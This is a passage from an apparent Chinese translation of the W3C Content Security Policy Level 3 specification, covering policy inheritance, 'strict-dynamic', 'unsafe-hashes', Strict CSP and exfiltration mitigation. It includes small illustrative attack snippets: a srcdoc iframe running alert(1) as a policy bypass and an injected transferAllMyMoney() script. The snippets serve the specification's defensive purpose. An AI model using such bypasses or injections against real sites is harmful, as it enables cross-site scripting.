                    class="content"> CSP 继承以避免绕过</span><a class="self-link" href="#security-inherit-csp"></a></h3>
            <p>从 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#local-scheme"
                    id="ref-for-local-scheme②">本地方案</a> 加载的文档将继承源文档中的策略副本。这样做的目的是确保页面无法通过嵌入框架或打开包含完全受其控制内容的新窗口来绕过其策略（例如
                <code>srcdoc</code> 文档、<code>blob:</code> 或 <code>data:</code> URLs、可通过 <code>document.write()</code>
                操作的 <code>about:blank</code> 文档等）。
            </p>
            <div class="example" id="example-d8547a52">
                <a class="self-link" href="#example-d8547a52"></a> 如果没有这种机制，页面可以通过简单地嵌入一个 <code>srcdoc</code>
                <code>iframe</code>，即使页面的执行上下文中没有 <code>unsafe-inline</code>，也可以执行内联脚本。
                <pre class="highlight"><c- p>&lt;</c-><c- f>iframe</c-> <c- e>srcdoc</c-><c- o>=</c-><c- s>"&lt;script>alert(1);&lt;/script>"</c-><c- p>>&lt;/</c-><c- f>iframe</c-><c- p>></c->
</pre>
            </div>
            <p>注意，我们创建了 <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①②">CSP
                    列表</a> 的副本，这意味着新 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①④">Document</a></code>
                的
                <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①③">CSP 列表</a>
                是其创建时相关策略的快照。在新 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⑤">Document</a></code>
                的
                <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①④">CSP 列表</a>
                中的修改不会影响源
                <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⑥">Document</a></code>
                的
                <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⑤">CSP
                    列表</a>，反之亦然。
            </p>
            <div class="example" id="example-46761516">
                <a class="self-link" href="#example-46761516"></a> 在下面的示例中，iframe 内的图片将不会加载，因为它被 iframe 中的
                <code>meta</code> 标签的策略阻止了。iframe 外的图片将会加载（假设主页面策略未阻止它），因为插入到 iframe 中的策略不会影响到主页面。
                <pre class="highlight"><c- p>&lt;</c-><c- f>iframe</c-> <c- e>srcdoc</c-><c- o>=</c-><c- s>'&lt;meta http-equiv="Content-Security-Policy" content="img-src example.com;"></c->
<c- s>                   &lt;img src="not-example.com/image">'</c-><c- p>>&lt;/</c-><c- f>iframe</c-><c- p>></c->

<c- p>&lt;</c-><c- f>img</c-> <c- e>src</c-><c- o>=</c-><c- s>"not-example.com/image"</c-><c- p>></c->
</pre>
            </div>
        </section>
        <section>
            <h2 class="heading settled" data-level="8" id="authoring-considerations"><span class="secno">8. </span><span
                    class="content"> 编写注意事项</span><a class="self-link" href="#authoring-considerations"></a></h2>
            <h3 class="heading settled" data-level="8.1" id="multiple-policies"><span class="secno">8.1. </span><span
                    class="content"> 多个策略的影响 </span><a class="self-link" href="#multiple-policies"></a></h3>
            <p><em>本节不是规范性内容。</em></p>
            <p>上述章节指出，当存在多个策略时，每个策略必须根据其类型进行强制或报告。一个示例有助于澄清这在实践中应该如何运作。在某些情况下，以下HTTP头可能会影响
                <code>XMLHttpRequest</code> 的行为：
            </p>
            <div class="example" id="example-7bb4ce67">
                <a class="self-link" href="#example-7bb4ce67"></a>
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑥">Content-Security-Policy</a>: default-src 'self' http://example.com http://example.net;
                 connect-src 'none';
<a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑦">Content-Security-Policy</a>: connect-src http://example.com/;
                 script-src http://example.com/
</pre>
            </div>
            <p>是否允许连接到 example.com？简单的答案是，不允许。强制实施这两个策略意味着潜在的连接必须同时满足两个策略。尽管第二个策略允许此连接，第一个策略包含
                <code>connect-src 'none'</code>，因此其强制执行会阻止连接。这意味着向策略列表添加附加策略只会进一步限制受保护资源的能力。
            </p>
            <p>为了进一步说明，请考虑页面上的一个脚本标签。第一个策略通过 <code>default-src</code> 指令将脚本限制在
                <code>'self'</code>、<code>http://example.com</code> 和
                <code>http://example.net</code> 内。而第二个策略只允许来自 <code>http://example.com/</code>
                的脚本。脚本将仅在符合两个策略的标准时加载：在此情况下，唯一符合条件的来源是
                <code>http://example.com</code>，因为两个策略都允许它。
            </p>
            <h3 class="heading settled" data-level="8.2" id="strict-dynamic-usage"><span class="secno">8.2. </span><span
                    class="content"> "<code>'strict-dynamic'</code>" 的使用 </span><a class="self-link"
                    href="#strict-dynamic-usage"></a></h3>
            <p><em>本节不是规范性内容。</em></p>
            <p>基于主机和路径的策略很难正确实现，尤其是在像CDN这样的大型来源上。<a
                    href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22#107-bytes">Cure53
                    的
                    H5SC 小挑战 3：“该死的 CSP！”的解决方案</a> <a data-link-type="biblio" href="#biblio-h5sc3"
                    title="H5SC Minichallenge 3: &quot;Sh*t, it&apos;s CSP!&quot;">[H5SC3]</a>
                是这种策略可能启用的绕过的很好例子，尽管 CSP 能够通过详尽声明特定资源来减轻这些绕过，但这些列表往往脆弱、笨拙，难以实施和维护。</p>
            <p>"<a data-link-type="grammar" href="#grammardef-strict-dynamic"
                    id="ref-for-grammardef-strict-dynamic④"><code>'strict-dynamic'</code></a>"
                源表达式旨在使内容安全策略（CSP）在现有应用程序中更易于部署，这些应用程序对它们直接加载的脚本具有高度信心，但对提前提供合理的资源加载列表缺乏信心。</p>
            <p>如果在 <a data-link-type="dfn" href="#script-src" id="ref-for-script-src②"><code>script-src</code></a> 或 <a
                    data-link-type="dfn" href="#default-src" id="ref-for-default-src⑤"><code>default-src</code></a>
                指令中存在，它具有两个主要影响：</p>
            <ol>
                <li data-md>
                    <p><a data-link-type="grammar" href="#grammardef-host-source"
                            id="ref-for-grammardef-host-source⑥">host-source</a> 和 <a data-link-type="grammar"
                            href="#grammardef-scheme-source" id="ref-for-grammardef-scheme-source④">scheme-source</a>
                        表达式，以及 "<a data-link-type="grammar" href="#grammardef-unsafe-inline"
                            id="ref-for-grammardef-unsafe-inline⑤"><code>'unsafe-inline'</code></a>"
                        和 "<a data-link-type="grammar" href="#grammardef-self"
                            id="ref-for-grammardef-self②⑨"><code>'self'</code></a> <a data-link-type="grammar"
                            href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source⑥">keyword-source</a>
                        将在加载脚本时被忽略。</p>
                    <p><a data-link-type="grammar" href="#grammardef-hash-source"
                            id="ref-for-grammardef-hash-source⑧">hash-source</a> 和 <a data-link-type="grammar"
                            href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source⑨">nonce-source</a>
                        表达式将被尊重。</p>
                <li data-md>
                    <p>由非 <a data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted"
                            id="ref-for-parser-inserted③">"解析器插入"</a>的
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①③">script</a></code>
                        元素触发的脚本请求是允许的。
                    </p>
            </ol>
            <p>第一个变化使得您可以以向后兼容的方式部署 "<a data-link-type="grammar" href="#grammardef-strict-dynamic"
                    id="ref-for-grammardef-strict-dynamic⑤"><code>'strict-dynamic'</code></a>"，无需用户代理嗅探：策略
                <code>'unsafe-inline' https: 'nonce-abcdefg' 'strict-dynamic'</code> 在支持 CSP1 的浏览器中将像
                <code>'unsafe-inline' https:</code> 一样工作，在支持 CSP2 的浏览器中将表现为
                <code>https: 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV'</code>，在支持 CSP3 的浏览器中则表现为
                <code>'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' 'strict-dynamic'</code>。
            </p>
            <p>第二个变化允许通过 nonce 或哈希获得对页面访问权限的脚本导入其依赖项，而无需在页面策略中显式添加它们。</p>
            <div class="example" id="example-78705861">
                <a class="self-link" href="#example-78705861"></a> 假设 MegaCorp, Inc. 部署了以下策略：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑧">Content-Security-Policy</a>: <a data-link-type="dfn" href="#script-src" id="ref-for-script-src③">script-src</a> 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' <a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic⑥">'strict-dynamic'</a>
</pre>
                <p>并在该策略激活的情况下提供以下HTML：</p>
                <pre class="highlight">...
<c- p>&lt;</c-><c- f>script</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://cdn.example.com/script.js"</c-> <c- e>nonce</c-><c- o>=</c-><c- s>"DhcnhD3khTMePgXwdayK9BsMqXjhguVV"</c-> <c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
...
</pre>
                <p>这将生成对 <code>https://cdn.example.com/script.js</code> 的请求，因为具有匹配的
                    <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce②">nonce</a></code>
                    属性，所以不会被阻止。
                </p>
                <p>如果 <code>script.js</code> 包含以下代码：</p>
                <pre class="highlight"><c- a>var</c-> s <c- o>=</c-> document<c- p>.</c->createElement<c- p>(</c-><c- t>'script'</c-><c- p>);</c->
s<c- p>.</c->src <c- o>=</c-> <c- t>'https://othercdn.not-example.net/dependency.js'</c-><c- p>;</c->
document<c- p>.</c->head<c- p>.</c->appendChild<c- p>(</c->s<c- p>);</c->

document<c- p>.</c->write<c- p>(</c-><c- t>'&lt;scr'</c-> <c- o>+</c-> <c- t>'ipt src="/sadness.js">&lt;/scr'</c-> <c- o>+</c-> <c- t>'ipt>'</c-><c- p>);</c->
</pre>
                <p><code>dependency.js</code> 将会加载，因为由 <code>createElement()</code> 创建的
                    <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①④">script</a></code>
                    元素不是 <a data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted"
                        id="ref-for-parser-inserted④">"解析器插入"</a> 的。
                </p>
                <p>然而，<code>sadness.js</code> 将不会加载，因为 <code>document.write()</code> 生成的
                    <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑤">script</a></code>
                    元素是 <a data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted"
                        id="ref-for-parser-inserted⑤">"解析器插入"</a> 的。
                </p>
            </div>
            <p class="note" role="note"><span class="marker">注意：</span> 使用 <a data-link-type="grammar"
                    href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic⑦">'strict-dynamic'</a>，
                在运行时创建的脚本将被允许执行。如果攻击者可以控制这样的脚本的位置，则该策略将允许加载任意脚本。使用
                <a data-link-type="grammar" href="#grammardef-strict-dynamic"
                    id="ref-for-grammardef-strict-dynamic⑧">'strict-dynamic'</a> 的开发人员应审计非解析器插入 API
                的使用，并确保它们不会被潜在的不可信数据调用。这包括在运行时决定脚本位置的应用程序或框架。
            </p>
            <section>
                <h3 class="heading settled" data-level="8.3" id="unsafe-hashes-usage"><span class="secno">8.3.
                    </span><span class="content"> "<code>'unsafe-hashes'</code>" 的使用 </span><a class="self-link"
                        href="#unsafe-hashes-usage"></a></h3>
                <p><em>本节不是规范性内容。</em></p>
                <p>传统网站和依赖传统组件的网站可能难以完全外部化事件处理程序。这些网站可以通过允许 <code>'unsafe-inline'</code> 来启用此类处理程序，但这是一种高风险的选择（而且不能与
                    nonce 或哈希结合使用）。</p>
                <p>"<a data-link-type="grammar" href="#grammardef-unsafe-hashes"
                        id="ref-for-grammardef-unsafe-hashes②"><code>'unsafe-hashes'</code></a>" 源表达式旨在简化这些情况下 CSP
                    的部署，使其更安全，通过允许开发人员使用哈希启用特定的处理程序。</p>
                <div class="example" id="example-02b7e69d">
                    <a class="self-link" href="#example-02b7e69d"></a> MegaCorp, Inc. 无法在合理的时间内完全去除以下 HTML 代码：
                    <pre
                        class="highlight"><c- p>&lt;</c-><c- f>button</c-> <c- e>id</c-><c- o>=</c-><c- s>"action"</c-> <c- e>onclick</c-><c- o>=</c-><c- s>"doSubmit()"</c-><c- p>></c-></pre>
                    <p>与其通过指定 "<code>'unsafe-inline'</code>" 来降低安全性，他们决定使用 "<code>'unsafe-hashes'</code>" 以及对应于
                        <code>doSubmit()</code> 的哈希源表达式，如下所示：
                    </p>
                    <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑨">Content-Security-Policy</a>: <a data-link-type="dfn" href="#script-src" id="ref-for-script-src④">script-src</a> <a data-link-type="grammar" href="#grammardef-unsafe-hashes" id="ref-for-grammardef-unsafe-hashes③">'unsafe-hashes'</a> 'sha256-jzgBGA4UWFFmpOBq0JpdsySukE1FrEN5bUpoK8Z29fY='</pre>
                </div>
                <p><code>'unsafe-hashes'</code>
                    提供的功能对传统网站非常有用，但在现代网站中应避免使用。特别需要注意的是，哈希允许特定脚本执行，但不能确保它按照开发人员的预期执行。如果一个有趣的功能暴露为内联事件处理程序（例如
                    <code>&lt;a onclick="transferAllMyMoney()">Transfer&lt;/a></code>），那么攻击者可以通过注入
                    <code>&lt;script>transferAllMyMoney()&lt;/script></code>
                    来利用它。开发人员应谨慎平衡允许特定脚本执行的风险与允许内联事件处理程序可能带来的部署优势。
                </p>
            </section>
            <section>
                <h3 class="heading settled" data-level="8.4" id="external-hash"><span class="secno">8.4. </span><span
                        class="content"> 通过哈希允许外部 JavaScript </span><a class="self-link" href="#external-hash"></a></h3>
                <p><em>本节不是规范性内容。</em></p>
                <p>在 <a data-link-type="biblio" href="#biblio-csp2" title="Content Security Policy Level 2">[CSP2]</a>
                    中，哈希
                    <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑨">源表达式</a>
                    仅能匹配内联脚本，但现在随着子资源完整性
                    <a data-link-type="biblio" href="#biblio-sri" title="Subresource Integrity">[SRI]</a>
                    的广泛部署，我们可以将范围扩展以启用外部化的 JavaScript。
                </p>
                <p>如果为一个
                    <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑥">script</a></code>
                    指定了多组完整性元数据，则只有当每个项在该
                    <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑦">script</a></code>
                    的完整性元数据都符合策略时，请求才会匹配策略的
                    <a data-link-type="grammar" href="#grammardef-hash-source"
                        id="ref-for-grammardef-hash-source⑨">hash-source</a>。
                </p>
                <p class="note" role="note"><span class="marker">注意：</span> CSP 规范规定，在计算内联
                    <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑧">script</a></code>
                    元素或事件处理程序的哈希之前，需要使用 <a data-link-type="dfn" href="https://encoding.spec.whatwg.org/#utf-8-encode"
                        id="ref-for-utf-8-encode①">UTF-8 编码</a> 对其内容进行编码。而
                    <a data-link-type="biblio" href="#biblio-sri" title="Subresource Integrity">[SRI]</a>
                    则对正在获取的原始资源计算哈希。这意味着，即使内联脚本块和外部脚本具有相同内容，允许它们的哈希也可能不同。
                </p>
                <div class="example" id="example-af80f2fd">
                    <a class="self-link" href="#example-af80f2fd"></a> MegaCorp, Inc.
                    希望以确保内容符合预期的方式在页面上允许两个特定的脚本。他们通过设置以下策略来实现：
                    <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②⓪">Content-Security-Policy</a>: script-src 'sha256-abc123' 'sha512-321cba'</pre>
                    <p>在该策略的作用下，以下
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑨">script</a></code>
                        元素将被允许执行，因为它们仅包含符合策略的完整性元数据：
                    </p>
                    <pre class="highlight"><c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123 sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
                    <p>而以下
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script②⓪">script</a></code>
                        元素将不会执行，因为它们包含的有效元数据不符合策略（尽管其他元数据符合）：
                    </p>
                    <pre class="highlight"><c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"</c-><b><c- s>sha384-xyz789</c-></b><c- s>"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"</c-><b><c- s>sha384-xyz789</c-></b><c- s> sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123 </c-><b><c- s>sha384-xyz789</c-></b><c- s> sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
                    <p>未被识别的元数据（无论是因为它完全无效，还是因为它指定了尚未支持的哈希算法）不会影响这里描述的行为。也就是说，在上述策略的存在下，以下元素将被允许执行，因为附加元数据无效，因此不会允许未在策略中明确列出的脚本执行：
                    </p>
                    <pre class="highlight"><c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123 </c-><b><c- s>sha1024-abcd</c-></b><c- s>"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha512-321cba </c-><b><c- s>entirely-invalid</c-></b><c- s>"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>integrity</c-><c- o>=</c-><c- s>"sha256-abc123 </c-><b><c- s>not-a-hash-at-all</c-></b><c- s> sha512-321cba"</c-> ...<c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
                </div>
            </section>
            <section>
                <h3 class="heading settled" data-level="8.5" id="strict-csp"><span class="secno">8.5. </span><span
                        class="content"> Strict CSP（严格内容安全策略）</span><a class="self-link" href="#strict-csp"></a></h3>
                <p><em>本节不是规范性内容。</em></p>
                <p>对抗 XSS 攻击部署有效的 CSP 是一项挑战（如 <a href="https://dl.acm.org/doi/10.1145/2976749.2978363">CSP Is Dead, Long
                        Live CSP!</a> 中所述
                    <a data-link-type="biblio" href="#biblio-long-live-csp"
                        title="CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy">[LONG-LIVE-CSP]</a>）。
                    然而，遵循以下 CSP 指令集被证明是对抗 XSS 的有效且可部署的缓解措施。
                </p>
                <ol>
                    <li data-md>
                        <p><em>script-src</em>：仅使用带有
                            <a data-link-type="grammar" href="#grammardef-source-expression"
                                id="ref-for-grammardef-source-expression②">源表达式</a>的<em>nonce</em> 和/或
                            <a data-link-type="grammar" href="#grammardef-source-expression"
                                id="ref-for-grammardef-source-expression③">源表达式</a>的 <em>hash</em>，
                            并使用 "<a data-link-type="grammar" href="#grammardef-strict-dynamic"
                                id="ref-for-grammardef-strict-dynamic⑨">'strict-dynamic'</a>"
                            <a data-link-type="grammar" href="#grammardef-keyword-source"
                                id="ref-for-grammardef-keyword-source⑦">关键字源</a>。
                        </p>
                        <p class="note" role="note"><span class="marker">注意：</span>虽然
                            "<a data-link-type="grammar" href="#grammardef-strict-dynamic"
                                id="ref-for-grammardef-strict-dynamic①⓪">'strict-dynamic'</a>" 允许简化部署（如
                            <a href="#strict-dynamic-usage">§ 8.2 "'strict-dynamic'" 的使用</a> 中所述），但应尽可能避免使用。
                        </p>
                        <p class="note" role="note"><span class="marker">注意：</span>为了向后兼容，建议在
                            "<a data-link-type="grammar" href="#grammardef-strict-dynamic"
                                id="ref-for-grammardef-strict-dynamic①①">'strict-dynamic'</a>" 旁边指定
                            <em>https:</em> <a data-link-type="grammar" href="#grammardef-scheme-source"
                                id="ref-for-grammardef-scheme-source⑤">方案源</a>。
                        </p>
                    <li data-md>
                        <p><em>base-uri</em>：指定 "<a data-link-type="grammar" href="#grammardef-self"
                                id="ref-for-grammardef-self③⓪">'self'</a>" 或 "<a data-link-type="grammar"
                                href="#grammardef-none" id="ref-for-grammardef-none②">'none'</a>"。</p>
                </ol>
                <p>满足上述条件的 CSP 称为严格内容安全策略（Strict CSP）。更多细节请参考
                    <a data-link-type="biblio" href="#biblio-webdev-strictcsp"
                        title="Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)">[WEBDEV-STRICTCSP]</a>。
                </p>
                <div class="example" id="example-ad7af9dc">
                    <a class="self-link" href="#example-ad7af9dc"></a> 以下是严格内容安全策略的示例：
                    <p>基于 nonce 的严格内容安全策略：</p>
                    <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②①">Content-Security-Policy</a>: script-src 'strict-dynamic' 'nonce-{RANDOM}'; base-uri 'self';</pre>
                    <p>基于哈希的严格内容安全策略：</p>
                    <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②②">Content-Security-Policy</a>: script-src 'strict-dynamic' 'sha256-{HASHED_INLINE_SCRIPT}'; base-uri 'self';</pre>
                </div>
            </section>
            <section>
                <h3 class="heading settled" data-level="8.6" id="exfiltration"><span class="secno">8.6. </span><span
                        class="content"> 数据泄漏 </span><a class="self-link" href="#exfiltration"></a></h3>
                <p><em>本节不是规范性内容。</em></p>
                <p>当请求的内容（如 URL）包含关于用户或页面的应当被限制且不应共享的信息时，可能会发生数据泄漏。</p>
                <p>如果使用内容安全策略（CSP）来创建允许页面通信的服务器的白名单，则可以减少数据泄漏的发生。
                    请注意，缺少 <a data-link-type="dfn" href="#default-src" id="ref-for-default-src⑥">default-src</a>
                    指令的策略无法有效阻止数据泄漏，
                    因为某些请求类型无法通过更具体的指令来进行控制（例如，<code><a data-link-type="attr-value" href="https://html.spec.whatwg.org/#link-type-prefetch" id="ref-for-link-type-prefetch①">prefetch</a></code>）。
                    <a data-link-type="biblio" href="#biblio-html" title="HTML Standard">[HTML]</a>
                </p>
                <div class="example" id="example-ae46ad12">
                    <a class="self-link" href="#example-ae46ad12"></a> 在以下示例中，对图片、字体和脚本的严格限制策略
                    仍然允许通过其他请求类型（如 <code>fetch()</code>、
                    <code><a data-link-type="attr-value" href="https://html.spec.whatwg.org/#link-type-prefetch" id="ref-for-link-type-prefetch②">prefetch</a></code>
                    等）进行数据泄漏：
                    <a data-link-type="biblio" href="#biblio-html" title="HTML Standard">[HTML]</a>
                    <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②③">Content-Security-Policy</a>: img-src 'none'; script-src 'none'; font-src 'none'</pre>
                    <p>通过补充 <code>default-src 'none'</code> 来提高页面抵御这种攻击的强度。</p>
                </div>
                <div class="example" id="example-d969ae08">
                    <a class="self-link" href="#example-d969ae08"></a> 在以下示例中，<a data-link-type="dfn"
                        href="#default-src" id="ref-for-default-src⑦">default-src</a> 指令
                    似乎保护了免受数据泄漏的影响，但 <a data-link-type="dfn" href="#img-src" id="ref-for-img-src④">img-src</a> 指令
                    使用通配符放宽了此限制，从而允许将数据泄漏到任意端点。策略的泄漏缓解能力取决于最不严格的指令白名单：
                    <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②④">Content-Security-Policy</a>: default-src 'none'; img-src *</pre>
                </div>
            </section>
            <section>
                <h2 class="heading settled" data-level="9" id="implementation-considerations"><span class="secno">9.
                    </span><span class="content">实现注意事项</span><a class="self-link"
                        href="#implementation-considerations"></a></h2>
                <h3 class="heading settled" data-level="9.1" id="extensions"><span class="secno">9.1. </span><span
                        class="content">特定供应商的扩展和插件</span><a class="self-link" href="#extensions"></a></h3>
                <p>对资源实施的 <a data-link-type="dfn" href="#content-security-policy-object"
                        id="ref-for-content-security-policy-object⑦⑤">策略</a> 不应干扰用户代理功能
                    的正常运行，例如插件、扩展或书签工具。这些功能通常优先考虑用户的需求而不是页面作者的需求，
                    正如 <a data-link-type="biblio" href="#biblio-html-design"
                        title="HTML Design Principles">[HTML-DESIGN]</a> 中所提倡的那样。
                </p>
                <p>此外，将 CSP 应用于这些功能会产生大量的违规报告噪音，显著降低其对开发者的价值。</p>
                <p>例如，Chrome 浏览器排除了对 <code>chrome-extension:</code> 方案的 CSP 检查，并采取了一些措施来确保允许由扩展驱动的注入操作，
                    无论页面的策略如何。
                </p>
            </section>
            <section>
                <h2 class="heading settled" data-level="10" id="iana-considerations"><span class="secno">10.
                    </span><span class="content">IANA 考虑事项</span><a class="self-link" href="#iana-considerations"></a>
                </h2>
                <h3 class="heading settled" data-level="10.1" id="iana-registry"><span class="secno">10.1. </span><span
                        class="content">指令注册表</span><a class="self-link" href="#iana-registry"></a></h3>
                <p>内容安全策略指令注册表应根据以下指令和参考资料进行更新
                    <a data-link-type="biblio" href="#biblio-rfc7762"
                        title="Content Security Policy 指令注册表的初始分配">[RFC7762]</a>：
                </p>
                <dl>
                    <dt data-md><a data-link-type="dfn" href="#base-uri"
                            id="ref-for-base-uri②"><code>base-uri</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-base-uri">§ 6.3.1 base-uri</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#child-src"
                            id="ref-for-child-src①"><code>child-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-child-src">§ 6.1.1 child-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#connect-src"
                            id="ref-for-connect-src③"><code>connect-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-connect-src">§ 6.1.2 connect-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#default-src"
                            id="ref-for-default-src⑧"><code>default-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-default-src">§ 6.1.3 default-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#font-src"
                            id="ref-for-font-src④"><code>font-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-font-src">§ 6.1.4 font-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#form-action"
                            id="ref-for-form-action"><code>form-action</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-form-action">§ 6.4.1 form-action</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#frame-ancestors"
                            id="ref-for-frame-ancestors⑤"><code>frame-ancestors</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-frame-ancestors">§ 6.4.2 frame-ancestors</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#frame-src"
                            id="ref-for-frame-src③"><code>frame-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-frame-src">§ 6.1.5 frame-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#img-src" id="ref-for-img-src⑤"><code>img-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-img-src">§ 6.1.6 img-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#manifest-src"
                            id="ref-for-manifest-src③"><code>manifest-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-manifest-src">§ 6.1.7 manifest-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#media-src"
                            id="ref-for-media-src③"><code>media-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-media-src">§ 6.1.8 media-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#object-src"
                            id="ref-for-object-src④"><code>object-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-object-src">§ 6.1.9 object-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#report-uri"
                            id="ref-for-report-uri④"><code>report-uri</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-report-uri">§ 6.5.1 report-uri</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#report-to"
                            id="ref-for-report-to⑤"><code>report-to</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-report-to">§ 6.5.2 report-to</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#sandbox" id="ref-for-sandbox③"><code>sandbox</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-sandbox">§ 6.3.2 sandbox</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#script-src"
                            id="ref-for-script-src⑤"><code>script-src</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-script-src">§ 6.1.10 script-src</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#script-src-attr"
                            id="ref-for-script-src-attr⑤"><code>script-src-attr</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-script-src-attr">§ 6.1.12 script-src-attr</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#script-src-elem"
                            id="ref-for-script-src-elem⑤"><code>script-src-elem</code></a>
                    <dd data-md>
                        <p>本文档（见 <a href="#directive-script-src-elem">§ 6.1.11 script-src-elem</a>）</p>
                    <dt data-md><a data-link-type="dfn" href="#style-src"
                            id="ref-for-style-src①"><code>style-src</code></a>
                    <dd data-md>
